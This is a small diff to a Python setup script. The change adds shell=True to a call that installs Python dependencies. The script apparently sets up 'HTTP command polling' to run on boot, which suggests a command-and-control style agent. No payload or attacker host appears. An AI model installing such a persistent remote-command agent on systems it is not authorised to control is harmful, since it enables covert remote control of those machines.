@@ -7,7 +7,7 @@ def httpc2():
     print("[*] Setting up HTTP Command Polling")
     print("\n")
     print("[*] Installing Dependencies")
-    subprocess.call("sudo pip3 install requests schedule")
+    subprocess.call("sudo pip3 install requests schedule", shell=True)
     print("\n")
     print("[*] Setting up HTTP command polling to run on boot")
     print("Make sure to edit the /bin/httpc2/httpc2.py to insert the proper URL into the r parameter")
